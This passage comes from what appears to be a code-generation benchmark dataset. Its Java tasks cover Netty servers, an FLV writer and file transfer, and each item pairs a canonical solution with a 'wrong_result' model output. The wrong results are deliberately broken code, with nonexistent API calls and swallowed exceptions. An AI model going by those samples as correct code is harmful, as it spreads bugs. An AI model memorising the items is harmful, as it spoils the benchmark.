ArrayList<>();\n        final DataStreamOutput out = client.getStreamOutput(file.getName(), fileSize, routingTable);\n        try (FileChannel in = FileUtils.newFileChannel(file, StandardOpenOption.READ)) {\n            for (long offset = 0L; offset < fileSize; ) {\n                offset += write(in, out, offset, futures);\n            }\n        } catch (Throwable e) {\n            throw new IOException(\"Failed to transfer \" + path);\n        } finally {\n            futures.add(out.closeAsync());\n        }\n        return futures;\n    }\n\n    abstract long write(FileChannel in, DataStreamOutput out, long offset,\n                       List<CompletableFuture<DataStreamReply>> futures) throws IOException;\n\n    @Override\n    public String toString() {\n        return JavaUtils.getClassSimpleName(getClass()) + \"{\" + path + \", size=\" + fileSize + \"}\";\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public abstract class TransferType {\n    protected String path;\n    protected File file;\n    protected long fileSize;\n    protected int bufferSize;\n    protected long syncSize;\n    protected long syncPosition;\n\n    public TransferType(String path, DataStream cli) {\n        this.path = path;\n        this.file = new File(path);\n        this.fileSize = file.length();\n        this.bufferSize = cli.getBufferSize();\n        this.syncSize = cli.getSyncSize();\n        this.syncPosition = 0;\n    }\n\n    public File getFile() {\n        return file;\n    }\n\n    public int getBufferSize() {\n        return bufferSize;\n    }\n\n    public long getPacketSize(long offset) {\n        long remaining = fileSize - offset;\n        return Math.min(bufferSize, remaining);\n    }\n\n    public boolean isSync(long position) {\n        return (position % syncSize) == 0;\n    }\n\n    public List<CompletableFuture<DataStreamReply>> transfer(FileStoreClient client, RoutingTable routingTable) {\n        List<CompletableFuture<DataStreamReply>> futures = new ArrayList<>();\n        try (FileChannel in = FileChannel.open(file.toPath(), StandardOpenOption.READ)) {\n            DataStreamOutput out = new DataStreamOutput();\n            long offset = 0;\n            while (offset < fileSize) {\n                long packetSize = getPacketSize(offset);\n                long bytesWritten = write(in, out, offset, futures);\n                offset += bytesWritten;\n                if (isSync(offset)) {\n                    syncPosition = offset;\n                }\n            }\n        } catch (IOException e) {\n            // Handle exception\n        }\n        return futures;\n    }\n\n    public abstract long write(FileChannel in, DataStreamOutput out, long offset, List<CompletableFuture<DataStreamReply>> futures);\n\n    @Override\n    public String toString() {\n        return \"TransferType{\" +\n               \"path='\" + path + '\\'' +\n               \", fileSize=\" + fileSize +\n               \", bufferSize=\" + bufferSize +\n               \", syncSize=\" + syncSize +\n               '}';\n    }\n}"
  },
  {
    "Task_id": 221,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of starting and stopping the server, and handling incoming client connections through a configurable pipeline.\n\nClass Description: MocoServer is a Netty-based TCP server implementation that provides simple start/stop functionality and allows for custom channel pipeline configuration. It manages server resources including event loop groups and channel futures.\n\nAttributes:\n- group: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- future: [ChannelFuture] - Future representing the server's channel binding operation\n\nMethods:\n- MocoServer() -> [void] - Constructor that initializes the event loop group\n- start([int port, ChannelInitializer<? extends Channel> pipelineFactory]) -> [int] - Starts the server on specified port with given pipeline configuration, returns actual bound port\n- stop() -> [void] - Stops the server gracefully, releasing all resources",
    "Canonical_solution": "import com.github.dreamhead.moco.MocoException;\nimport com.github.dreamhead.moco.util.MocoExecutors;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.Future;\n\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.util.concurrent.TimeUnit;\n\npublic final class MocoServer {\n    private EventLoopGroup group;\n    private ChannelFuture future;\n\n    public MocoServer() {\n        group = new NioEventLoopGroup(0, MocoExecutors.executor());\n    }\n\n    public int start(final int port, final ChannelInitializer<? extends Channel> pipelineFactory) {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(group)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(pipelineFactory);\n\n        try {\n            future = bootstrap.bind(port).sync();\n            SocketAddress socketAddress = future.channel().localAddress();\n            return ((InetSocketAddress) socketAddress).getPort();\n        } catch (InterruptedException e) {\n            throw new MocoException(e);\n        }\n    }\n\n    public void stop() {\n        if (future != null) {\n            future.channel().close().syncUninterruptibly();\n            future = null;\n        }\n\n        if (group != null) {\n            Future<?> groupFuture = group.shutdownGracefully(0, 0, TimeUnit.SECONDS);\n            try {\n                groupFuture.get();\n            } catch (Exception e) {\n                throw new IllegalStateException(e);\n            }\n            group = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class MocoServer {\n    private EventLoopGroup group;\n    private ChannelFuture future;\n\n    public MocoServer() {\n        group = new NioEventLoopGroup();\n    }\n\n    public int start(int port, ChannelInitializer<? extends Channel> pipelineFactory) {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(group)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(pipelineFactory);\n        future = bootstrap.bind(port).syncUninterruptibly();\n        return future.channel().localAddress().port();\n    }\n\n    public void stop() {\n        if (future != null) {\n            future.cancel(true);\n        }\n        group.shutdownGracefully();\n    }\n}"
  },
  {
    "Task_id": 224,
    "Instruction": "Task Description: Create a Java class that implements a WebSocket server using Netty framework to handle WebSocket connections and messages.\n\nClass Description: The WebSocketServer class is responsible for initializing and running a Netty-based WebSocket server. It configures the server with appropriate handlers for HTTP and WebSocket protocols, manages connection threads, and binds to a specified port.\n\nAttributes:\n- initParamDTO: InitParamDTO - Configuration parameters for the server including port number and thread counts\n\nMethods:\n- WebSocketServer(InitParamDTO initParamDTO) -> None - Constructor that initializes the server with configuration parameters\n- run() -> None - Starts the WebSocket server, configures the pipeline with necessary handlers, and binds to the specified port",
    "Canonical_solution": "import com.cf.carpark.service.core.dto.InitParamDTO;\nimport com.cf.carpark.service.websocket.handler.WebSocketFrameHandler;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.util.CharsetUtil;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.net.InetSocketAddress;\n\n@Slf4j\npublic class WebSocketServer {\n\n    private InitParamDTO initParamDTO;\n\n    public void run() {\n        EventLoopGroup boosGroup = new NioEventLoopGroup(initParamDTO.getBoosTread());\n        EventLoopGroup workGroup = new NioEventLoopGroup(initParamDTO.getWorkTread());\n        try {\n            ServerBootstrap serverBootstrap = new ServerBootstrap();\n            InitParamDTO initParamDTO = this.initParamDTO;\n            serverBootstrap.group(boosGroup, workGroup).channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel socketChannel) throws Exception {\n                            ChannelPipeline pipeline = socketChannel.pipeline();\n\n                            pipeline.addLast(new HttpServerCodec());\n                            pipeline.addLast(new ChunkedWriteHandler());\n                            pipeline.addLast(new StringDecoder(CharsetUtil.UTF_8));\n                            pipeline.addLast(new StringEncoder(CharsetUtil.UTF_8));\n                            pipeline.addLast(new HttpObjectAggregator(1024 * 1024));\n                            pipeline.addLast(new WebSocketServerProtocolHandler(\"/ws\"));\n                            pipeline.addLast(new WebSocketFrameHandler(initParamDTO));\n                        }\n                    });\n\n            ChannelFuture channelFuture = serverBootstrap.bind(new InetSocketAddress(this.initParamDTO.getPort()))\n                    .addListener(future -> {\n                        log.info(\"\u670d\u52a1\u7aef\u6210\u529f\u7ed1\u5b9a\u7aef\u53e3\u53f7={}\", this.initParamDTO.getPort());\n                    });\n        } catch (Exception e) {\n            boosGroup.shutdownGracefully();\n            workGroup.shutdownGracefully();\n            log.error(\"websocketServer\u542f\u52a8\u5931\u8d25:{}\", e);\n        }\n    }\n\n    public WebSocketServer(InitParamDTO initParamDTO) {\n        this.initParamDTO = initParamDTO;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class WebSocketServer {\n    private final InitParamDTO initParamDTO;\n\n    public WebSocketServer(InitParamDTO initParamDTO) {\n        this.initParamDTO = initParamDTO;\n    }\n\n    public void run() {\n        EventLoopGroup boss = new NioEventLoopGroup(initParamDTO.getThreadCount());\n        EventLoopGroup worker = new NioEventLoopGroup(initParamDTO.getThreadCount());\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(boss, worker)\n                     .channel(NioServerSocketChannel.class)\n                     .childHandler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) throws Exception {\n                             ChannelPipeline pipeline = ch.pipeline();\n                             pipeline.addLast(new HttpServerCodec());\n                             pipeline.addLast(new WebSocketServerProtocolHandler(\"/ws\"));\n                             pipeline.addLast(new WebSocketServerHandler());\n                         }\n                     })\n                     .childOption(ChannelOption.TCP_NODELAY, true)\n                     .childOption(ChannelOption.SO_REUSEADDR, true)\n                     .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(initParamDTO.getPort()).sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            boss.shutdownGracefully();\n            worker.shutdownGracefully();\n        }\n    }\n\n    static class WebSocketServerHandler extends SimpleChannelInboundHandler<TextMessage> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, TextMessage msg) throws Exception {\n            System.out.println(\"Received: \" + msg.text());\n            ctx.writeAndFlush(new TextMessage(\"Echo: \" + msg.text()));\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 225,
    "Instruction": "Task Description: Implement a WebSocket proxy server using Java Netty framework to handle WebSocket connections and manage client-server communication.\n\nClass Description: WebsocketProxy is a class that implements a Proxy interface and provides functionality to start a WebSocket server on a specified port. It handles WebSocket protocol upgrades, HTTP requests, and manages client connections with proper resource cleanup.\n\nAttributes:\n- None (All variables are local to methods)\n\nMethods:\n- start(int port) -> void - Starts the WebSocket server on the specified port. Initializes event loop groups, configures server bootstrap with appropriate channel and handlers, binds to the port, and manages server lifecycle including graceful shutdown. Throws InterruptedException if the thread is interrupted during server operation.\n\nInput:\n- port: int - The port number on which the WebSocket server should listen for incoming connections\n\nOutput:\n- None (Void method, but it will start a server that listens on the specified port and handles WebSocket connections)\n\nNote: The implementation should include proper error handling, resource management, and support for both NIO and Epoll transport mechanisms based on system availability. The server should handle WebSocket protocol upgrades, HTTP codecs, chunked writes, and idle connection management.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.Epoll;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.nico.ratel.landlords.print.SimplePrinter;\nimport org.nico.ratel.landlords.robot.RobotDecisionMakers;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.TimeUnit;\n\npublic class WebsocketProxy implements Proxy {\n\n    @Override\n    public void start(int port) throws InterruptedException {\n        EventLoopGroup parentGroup = Epoll.isAvailable() ? new EpollEventLoopGroup() : new NioEventLoopGroup();\n        EventLoopGroup childGroup = Epoll.isAvailable() ? new EpollEventLoopGroup() : new NioEventLoopGroup();\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap()\n                    .group(parentGroup, childGroup)\n                    .channel(Epoll.isAvailable() ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n                    .localAddress(new InetSocketAddress(port))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline()\n                                    .addLast(new IdleStateHandler(60 * 30, 0, 0, TimeUnit.SECONDS))\n                                    .addLast(new HttpServerCodec())\n                                    .addLast(new ChunkedWriteHandler())\n                                    .addLast(new HttpObjectAggregator(8192))\n                                    .addLast(\"ws\", new WebSocketServerProtocolHandler(\"/ratel\"))\n                                    .addLast(new WebsocketTransferHandler());\n                        }\n                    });\n\n            ChannelFuture f = bootstrap.bind().sync();\n\n            SimplePrinter.serverLog(\"The websocket server was successfully started on port \" + port);\n            RobotDecisionMakers.init();\n            f.channel().closeFuture().sync();\n        } finally {\n            parentGroup.shutdownGracefully();\n            childGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class WebsocketProxy {\n    public void start(int port) throws InterruptedException {\n        EventLoopGroup bossGroup;\n        EventLoopGroup workerGroup;\n\n        if (Epoll.isAvailable()) {\n            bossGroup = new EpollEventLoopGroup();\n            workerGroup = new EpollEventLoopGroup();\n        } else {\n            bossGroup = new NioEventLoopGroup();\n            workerGroup = new NioEventLoopGroup();\n        }\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup);\n            if (Epoll.isAvailable()) {\n                b.channel(EpollServerSocketChannel.class);\n            } else {\n                b.channel(NioServerSocketChannel.class);\n            }\n\n            b.childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) {\n                    ChannelPipeline p = ch.pipeline();\n                    p.addLast(new HttpServerCodec());\n                    p.addLast(new HttpObjectAggregator(65536));\n                    p.addLast(new WebSocketServerProtocolHandler(\"/websocket\"));\n                    p.addLast(new IdleStateHandler(30, 0, 0, TimeUnit.SECONDS));\n                    p.addLast(new WebSocketFrameHandler());\n                }\n            });\n\n            ChannelFuture future = b.bind(port).sync();\n\n            future.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private static class WebSocketFrameHandler extends SimpleChannelInboundHandler<WebSocketFrame> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, WebSocketFrame frame) {\n            if (frame instanceof TextWebSocketFrame) {\n                String text = ((TextWebSocketFrame) frame).text();\n                System.out.println(\"Received: \" + text);\n                ctx.writeAndFlush(new TextWebSocketFrame(text));\n            } else if (frame instanceof BinaryWebSocketFrame) {\n                ctx.writeAndFlush(frame.retain());\n            } else {\n                // Handle other frame types\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 227,
    "Instruction": "Task Description: Implement a Netty-based HTTP server in Java that handles incoming HTTP requests with tracing capabilities for specific endpoints.\n\nClass Description: NettyHttpServer is a TCP server implementation using Netty framework that listens for HTTP requests. It provides tracing functionality for specific endpoints (\"/unsampled\" and \"/traced\") while serving regular requests for other paths. The server manages its lifecycle through start and stop methods.\n\nAttributes:\n- bossGroup: [EventLoopGroup] - Handles incoming connections (accept loop)\n- workerGroup: [EventLoopGroup] - Handles I/O operations for established connections\n\nMethods:\n- startServer() -> [int] - Starts the HTTP server on an available port, returns the bound port number\n- stopServer() -> [void] - Shuts down the server gracefully, releasing all resources\n- TracingDispatchHandler (inner class) - Handles request tracing for specific endpoints\n  - channelRead(ChannelHandlerContext, Object) -> [void] - Processes incoming messages and routes them to appropriate tracing handlers\n  - write(ChannelHandlerContext, Object, ChannelPromise) -> [void] - Processes outgoing messages with tracing context",
    "Canonical_solution": "import brave.Tracing;\nimport brave.baggage.BaggagePropagation;\nimport brave.baggage.BaggagePropagationConfig.SingleBaggageField;\nimport brave.propagation.B3Propagation;\nimport brave.sampler.Sampler;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelDuplexHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.util.AttributeKey;\nimport java.net.InetSocketAddress;\n\npublic class NettyHttpServer {\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public int startServer() throws InterruptedException {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.option(ChannelOption.SO_BACKLOG, 1024);\n        b.group(bossGroup, workerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<Channel>() {\n                @Override\n                protected void initChannel(final Channel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    p.addLast(new HttpServerCodec());\n                    p.addLast(new TracingDispatchHandler());\n                    p.addLast(new HelloWorldHandler());\n                }\n            });\n\n        Channel ch = b.bind(0).sync().channel();\n        return ((InetSocketAddress) ch.localAddress()).getPort();\n    }\n\n    public void stopServer() {\n        if (bossGroup != null) bossGroup.shutdownGracefully();\n        if (workerGroup != null) workerGroup.shutdownGracefully();\n    }\n\n    static class TracingDispatchHandler extends ChannelDuplexHandler {\n        static final AttributeKey<String> URI_ATTRIBUTE = AttributeKey.valueOf(\"uri\");\n\n        final ChannelDuplexHandler unsampled = NettyHttpTracing.create(\n            Tracing.newBuilder().sampler(Sampler.NEVER_SAMPLE).build()\n        ).serverHandler();\n        final ChannelDuplexHandler traced = NettyHttpTracing.create(\n            Tracing.newBuilder()\n                .propagationFactory(BaggagePropagation.newFactoryBuilder(B3Propagation.FACTORY)\n                .build()\n        ).serverHandler();\n\n        @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            if (!(msg instanceof HttpRequest)) {\n                ctx.fireChannelRead(msg);\n                return;\n            }\n            String uri = ((HttpRequest) msg).uri();\n            if (\"/unsampled\".equals(uri)) {\n                ctx.channel().attr(URI_ATTRIBUTE).set(uri);\n                unsampled.channelRead(ctx, msg);\n            } else if (\"/traced\".equals(uri)) {\n                ctx.channel().attr(URI_ATTRIBUTE).set(uri);\n                traced.channelRead(ctx, msg);\n            } else {\n                ctx.fireChannelRead(msg);\n            }\n        }\n\n        @Override\n        public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise prm) throws Exception {\n            String uri = ctx.channel().attr(URI_ATTRIBUTE).get();\n            if (uri == null) {\n                ctx.write(msg, prm);\n                return;\n            }\n            if (\"/unsampled\".equals(uri)) {\n                unsampled.write(ctx, msg, prm);\n            } else if (\"/traced\".equals(uri)) {\n                traced.write(ctx, msg, prm);\n            } else {\n                ctx.write(msg, prm);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyHttpServer {\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private ServerBootstrap bootstrap;\n\n    public int startServer() {\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                 .channel(NioServerSocketChannel.class)\n                 .childHandler(new ChannelInitializer<SocketChannel>() {\n                     @Override\n                     protected void initChannel(SocketChannel ch) {\n                         ChannelPipeline p = ch.pipeline();\n                         p.addLast(new HttpServerCodec());\n                         p.addLast(new HttpObjectAggregator(65536));\n                         p.addLast(new TracingDispatchHandler());\n                     }\n                 })\n                 .bind(0).sync();\n        return bootstrap.childChannel().channel().localPort();\n    }\n\n    public void stopServer() {\n        bootstrap.channel().closeFuture().sync();\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static class TracingDispatchHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof FullHttpRequest) {\n                FullHttpRequest request = (FullHttpRequest) msg;\n                String uri = request.uri();\n                if (\"/traced\".equals(uri)) {\n                    FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n                    response.headers().add(\"Trace-ID\", \"12345\");\n                    ctx.write(response);\n                    ctx.flush();\n                } else if (\"/unsampled\".equals(uri)) {\n                    FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n                    response.content().writeBytes(\"Unsampled\".getBytes(StandardCharsets.UTF_8));\n                    ctx.write(response);\n                    ctx.flush();\n                } else {\n                    FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n                    response.content().writeBytes(\"Hello World\".getBytes(StandardCharsets.UTF_8));\n                    ctx.write(response);\n                    ctx.flush();\n                }\n            }\n        }\n\n        @Override\n        public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise promise) {\n            if (msg instanceof FullHttpResponse) {\n                FullHttpResponse response = (FullHttpResponse) msg;\n                response.headers().add(\"Trace-ID\", \"67890\");\n                ctx.write(msg, promise);\n            } else {\n                ctx.write(msg, promise);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 23,
    "Instruction": "Task Description: Create a Java class for writing FLV (Flash Video) files using Java NIO's FileChannel and ByteBuffer for efficient file operations. The class should handle both new file creation and appending to existing files, including metadata management.\n\nClass Description: The FLVWriter class provides functionality to write FLV video files with proper headers, metadata tags, and media data tags. It uses Java NIO channels and buffers for efficient file operations, supporting both new file creation and appending to existing files while maintaining FLV format specifications.\n\nAttributes:\n- fileChannel: [SeekableByteChannel] - Channel for writing the final FLV output file\n- dataChannel: [SeekableByteChannel] - Temporary channel for storing tags before finalization\n- filePath: [String] - Path to the output FLV file\n- append: [boolean] - Flag indicating whether to append to an existing file\n- appendOffset: [long] - Position in existing file where new data should be appended\n- meta: [Map<String, ?>] - Metadata extracted from existing FLV file when appending\n\nMethods:\n- FLVWriter(String filePath) -> [void] - Constructor that initializes the writer with a file path for new file creation\n- FLVWriter(Path path, boolean append) -> [void] - Constructor that initializes the writer with append mode and handles existing file metadata\n- getMetaData(Path path, int maxTags) -> [Map<String, ?>] - Extracts metadata from an existing FLV file (private method)\n- createDataFile() -> [void] - Creates a temporary data file for storing tags (private method)\n- createOutputFile() -> [void] - Creates the final output FLV file (private method)\n- writeTag(ITag tag) -> [boolean] - Writes a media tag to the temporary data file\n- close() -> [void] - Finalizes the FLV file and cleans up resources\n- finalizeFlv() -> [long] - Combines temporary data with existing file (if appending) and writes final FLV file (private method)",
    "Canonical_solution": "import java.io.File;\nimport java.io.IOException;\nimport java.io.RandomAccessFile;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Map;\n\npublic class FLVWriter {\n\n    private static final Logger log = LoggerFactory.getLogger(FLVWriter.class);\n\n    private SeekableByteChannel fileChannel;\n    private SeekableByteChannel dataChannel;\n    private String filePath;\n    private boolean append;\n    private long appendOffset = 13L;\n    private Map<String, ?> meta;\n\n    public FLVWriter(String filePath) {\n        this.filePath = filePath;\n        try {\n            createDataFile();\n        } catch (Exception e) {\n            log.error(\"Failed to create FLV writer\", e);\n        }\n    }\n\n    public FLVWriter(Path path, boolean append) {\n        filePath = path.toFile().getAbsolutePath();\n        this.append = append;\n        try {\n            if (append) {\n                meta = getMetaData(path, 5);\n                Files.move(path, path.resolveSibling(path.toFile().getName().replace(\".flv\", \".old\")));\n            }\n            createDataFile();\n        } catch (Exception e) {\n            log.error(\"Failed to create FLV writer\", e);\n        }\n    }\n\n    private Map<String, ?> getMetaData(Path path, int maxTags) throws IOException {\n        Map<String, ?> meta = null;\n        try (SeekableByteChannel channel = Files.newByteChannel(path, StandardOpenOption.READ)) {\n            long size = channel.size();\n            if (size > 0L) {\n                channel.position(appendOffset);\n                ByteBuffer dst = ByteBuffer.allocate(11);\n                do {\n                    int read = channel.read(dst);\n                    if (read > 0) {\n                        dst.flip();\n                        byte tagType = (byte) (dst.get() & 31);\n                        int bodySize = IOUtils.readUnsignedMediumInt(dst);\n                        if (tagType == ITag.TYPE_METADATA) {\n                            ByteBuffer buf = ByteBuffer.allocate(bodySize);\n                            read = channel.read(buf);\n                            if (read > 0) {\n                                buf.flip();\n                                Input input = new Input(IoBuffer.wrap(buf));\n                                String metaType = Deserializer.deserialize(input, String.class);\n                                meta = Deserializer.deserialize(input, Map.class);\n                                if (meta.containsKey(\"duration\")) {\n                                    appendOffset = channel.position() + 4L;\n                                    break;\n                                }\n                            }\n                            buf.compact();\n                        }\n                        channel.position(channel.position() + 4L);\n                        dst.compact();\n                    }\n                } while (--maxTags > 0);\n            }\n        }\n        return meta;\n    }\n\n    private void createDataFile() throws IOException {\n        Path path = Paths.get(filePath + \".ser\");\n        if (Files.deleteIfExists(path)) {\n            log.debug(\"Previous flv data file existed and was removed\");\n        }\n        this.dataChannel = Files.newByteChannel(path, StandardOpenOption.CREATE_NEW, StandardOpenOption.WRITE, StandardOpenOption.READ);\n    }\n\n    private void createOutputFile() throws IOException {\n        this.fileChannel = Files.newByteChannel(Paths.get(filePath), StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);\n    }\n\n    public boolean writeTag(ITag tag) throws IOException {\n        try {\n            int bodySize = tag.getBodySize();\n            byte dataType = tag.getDataType();\n            IoBuffer tagBody = tag.getBody();\n            int totalTagSize = 11 + bodySize + 4;\n            ByteBuffer tagBuffer = ByteBuffer.allocate(totalTagSize);\n            int timestamp = tag.getTimestamp();\n            byte[] bodyBuf = new byte[bodySize];\n            tagBody.get(bodyBuf);\n            IOUtils.writeUnsignedByte(tagBuffer, dataType);\n            IOUtils.writeMediumInt(tagBuffer, bodySize);\n            IOUtils.writeExtendedMediumInt(tagBuffer, timestamp);\n            tagBuffer.put(new byte[] {0, 0, 0});\n            tagBuffer.put(bodyBuf);\n            tagBuffer.putInt(11 + bodySize);\n            tagBuffer.flip();\n            dataChannel.write(tagBuffer);\n            return true;\n        } catch (Exception e) {\n            log.error(\"Failed to write tag\", e);\n            return false;\n        }\n    }\n\n    public void close() {\n        try {\n            finalizeFlv();\n        } catch (Exception e) {\n            log.error(\"Failed to finalize FLV\", e);\n        } finally {\n            try {\n                if (dataChannel != null) dataChannel.close();\n                if (fileChannel != null) fileChannel.close();\n            } catch (IOException e) {\n                log.error(\"Failed to close channels\", e);\n            }\n        }\n    }\n\n    private long finalizeFlv() throws IOException {\n        createOutputFile();\n        writeHeader();\n        writeMetadataTag();\n        ByteBuffer dst = ByteBuffer.allocate(1024);\n        if (append) {\n            Path prevFlv = Paths.get(filePath.replace(\".flv\", \".old\"));\n            if (Files.exists(prevFlv)) {\n                try (SeekableByteChannel prevChannel = Files.newByteChannel(prevFlv, StandardOpenOption.READ)) {\n                    prevChannel.position(appendOffset);\n                    int read;\n                    do {\n                        read = prevChannel.read(dst);\n                        if (read > 0) {\n                            dst.flip();\n                            fileChannel.write(dst);\n                            dst.compact();\n                        }\n                    } while (read > 0);\n                }\n                Files.deleteIfExists(prevFlv);\n            }\n        }\n        dataChannel.position(0L);\n        int read;\n        do {\n            read = dataChannel.read(dst);\n            if (read > 0) {\n                dst.flip();\n                fileChannel.write(dst);\n                dst.compact();\n            }\n        } while (read > 0);\n        Files.deleteIfExists(Paths.get(filePath + \".ser\"));\n        return fileChannel.position();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class FLVWriter {\n    private SeekableByteChannel fileChannel;\n    private SeekableByteChannel dataChannel;\n    private String filePath;\n    private boolean append;\n    private long appendOffset;\n    private Map<String, ?> meta;\n\n    public FLVWriter(String filePath) {\n        this.filePath = filePath;\n        this.append = false;\n        createOutputFile();\n        createDataFile();\n    }\n\n    public FLVWriter(Path path, boolean append) {\n        this.filePath = path.toString();\n        this.append = append;\n        try {\n            this.fileChannel = FileChannel.open(path, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            if (append) {\n                this.appendOffset = fileChannel.size();\n                this.meta = getMetaData(path, 10);\n            } else {\n                this.meta = null;\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        createDataFile();\n    }\n\n    private Map<String, ?> getMetaData(Path path, int maxTags) {\n        try {\n            FileChannel fc = FileChannel.open(path, StandardOpenOption.READ);\n            fc.position(0);\n            ByteBuffer buf = ByteBuffer.allocate(9);\n            fc.read(buf);\n            buf.flip();\n            byte[] header = new byte[9];\n            buf.get(header);\n            fc.close();\n            return new HashMap<>();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return new HashMap<>();\n        }\n    }\n\n    private void createDataFile() {\n        try {\n            Path tempPath = 